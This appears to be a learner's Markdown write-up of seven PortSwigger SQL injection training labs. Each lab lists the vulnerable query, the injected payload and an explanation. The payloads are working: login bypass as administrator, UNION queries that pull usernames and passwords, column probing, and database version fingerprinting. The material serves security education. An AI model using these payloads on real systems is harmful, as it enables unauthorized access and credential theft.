# SQL Injection Labs 

## Lab 1: Retrieve hidden data

**Link:** (https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

### Objective
Retrieve products that are normally hidden because they have not been released.

### Assumptions
- Category: Gifts
- The application filters products using a released condition.

### Example query

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
```sql
SELECT * FROM products WHERE category = 'Gifts'-- ' AND released = 1
```

### Payload

```sql
category=Gifts'--
```

### Explanation

Since the double dash is a comment indicator in SQL, the rest of the query is commented out and shows hidden unreleased products by removing the released check from the WHERE clause.


---

## Lab 2: Login bypass

**Link:**(https://portswigger.net/web-security/sql-injection/lab-login-bypass)

### Objective
Bypass authentication by an unsafe SQL query in the login

### Assumption:

- username: administrator

### Example query

```sql
SELECT * FROM users
WHERE 
username ='fu_94' AND password = '123';
```
```sql
SELECT * FROM users
WHERE username ='administrator'-- AND password = '123'
```

### Payload

```sql
administrator'--
```

The attcker can login by removing the password check from the WHERE clause and as in Lab 1 the comment indicator -- comments out the rest of the query.

---

## Lab 3: UNION attack: retrieve data from other tables

**Link:**(https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

### Objective
Using a UNION attack to retrieve data from a table other than the one originally queried.

### Assumption:

- table: users
- columns: username, password

### Example query

```sql
SELECT name, description FROM products
WHERE category = 'Gifts';
```

```sql
SELECT name, description FROM products
WHERE category = 'Gifts'
UNION 
SELECT username, password 
FROM users--
```

### Payload

```sql
Gifts' UNION SELECT username, password FROM users--
```
### Explanation

BY using UNION is possible to combine two result sets that have same number of colums and types.The app can't tell if the rows came from "users" instead of "products", so it will display all the usernames and passwords.

---

## Lab 4: Determine the number of columns

**Link:**(https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

### Objective
Determine how many columns the original query returns

### Assumption:

- number of columns

### Example query

```sql
SELECT * FROM products
WHERE category = 'Gifts'
ORDER BY 3--'
```

### Payload

```sql
Gifts' ORDER BY 1--
Gifts' ORDER BY 2--
Gifts' ORDER BY 3--

```
### Explanation

To find out the number of colums the attacker can inject a series of ORDER BY and incrementing the column index until until the database gives an error.

---

## Lab 5: Finding a column containing text

**Link:**(https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

### Objective
Identify which result column can accept and display text.

### Assumption:

- column containing text

### Example query

```sql
SELECT * FROM products
WHERE category = 'Gifts'
UNION SELECT 'a', NULL;
```

### Payload

```sql
Gifts' UNION SELECT 'a',NULL--
Gifts' UNION SELECT NULL,'a'--
```
### Explanation

By putting a string where is expected a number, creates a mismatch that can be found by testing one column at a time, until finding the one who takes the text.

---

## Lab 6: Retrieve multiple values in a single column

**Link:**(https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

### Objective
Combine multiple database values into a single text column

### Assumption:

- Only one result column is compatible with text


### Payload

```sql
SELECT * FROM products
WHERE category = 'Gifts'
UNION SELECT NULL, username || '~' || password FROM users;
```

### Injection concept

```sql
Gifts' UNION SELECT NULL, username || '~' || password FROM users--
```
### Explanation

The "||" operator joins two text values into one combined string  and is used in this case, because there is only one column text compatible. UNION merges "users" and "products" into the reslut set and the app displays every row.

---

## Lab 7: Examine the database

**Link:**(https://portswigger.net/web-security/sql-injection/examining-the-database)

### Objective
Identify the database engine and database-specific syntax

### Assumption:

- unknown database type and version

### Example query

```sql
SELECT * FROM products
WHERE category = 'Gifts'
UNION SELECT NULL, @@version;
```

```sql
Gifts' UNION SELECT NULL,@@version--        
-- MySQL / SQL Server
Gifts' UNION SELECT NULL,version()--        
-- PostgreSQL
Gifts' UNION SELECT NULL,banner FROM v$version-- 
-- Oracle
```
### Explanation

Every database engine can expose its version differently. The format of the string returned identifies the engine, which points to which syntax to use for listing tables and columns to find and extract the credentials table.
